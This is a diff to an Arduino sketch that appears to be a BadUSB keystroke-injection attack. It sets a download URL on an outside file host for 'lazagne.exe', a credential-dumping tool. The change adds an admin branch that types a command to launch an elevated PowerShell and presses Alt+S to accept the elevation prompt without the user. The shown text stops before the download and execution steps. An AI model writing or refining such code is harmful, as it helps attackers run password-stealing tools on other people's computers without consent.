@@ -2,6 +2,8 @@
 
 #define defaultDelay 5
 
+bool admin = true;
+
 String filename = "lazagne.exe";
 String fileurl = "https://s3.nofilecdn.io/g/uDVgXgogfrlwS8TKj0P65PHHan3bbXqg2GhXXaAOuwWGK3CA2o5J5XrdmH9tcsjq/laZagne.exe";
 
@@ -23,14 +25,24 @@ void setup(){
 
   delay(500);
 
-  Keyboard.print("powershell Start-Process powershell -Verb RunAs");
-  typeKey(KEY_RETURN);
+  if(admin)
+  {
 
-  delay(1000);
+    Keyboard.print("powershell Start-Process powershell -Verb RunAs");
+    typeKey(KEY_RETURN);
+  
+    delay(1000);
+  
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('s');
+    Keyboard.releaseAll();
+    
+  } else {
 
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('s');
-  Keyboard.releaseAll();
+     Keyboard.print("powershell");
+    typeKey(KEY_RETURN);
+    
+  }
 
   delay(1000);
 
